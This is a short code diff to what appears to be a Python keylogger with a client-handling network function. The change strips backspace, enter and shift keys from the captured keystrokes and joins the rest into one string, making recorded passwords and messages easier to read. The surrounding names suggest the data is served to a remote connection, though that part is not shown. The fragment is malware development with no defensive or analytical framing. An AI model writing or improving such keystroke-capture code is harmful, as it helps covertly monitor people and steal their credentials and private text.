@@ -101,7 +101,13 @@ def stop_keylogger():
 
 def dump_keylogger_data():
     global keylogger_data
-    return '\n'.join(keylogger_data)
+    filtered_data = []
+    skip_keys = {"backspace", "enter", "left shift", "right shift", "shift"}
+    for key in keylogger_data:
+        if key in skip_keys:
+            continue
+        filtered_data.append(key)
+    return ''.join(filtered_data)
 
 def handle_client(client_socket, addr):
     target_ip, target_port = addr
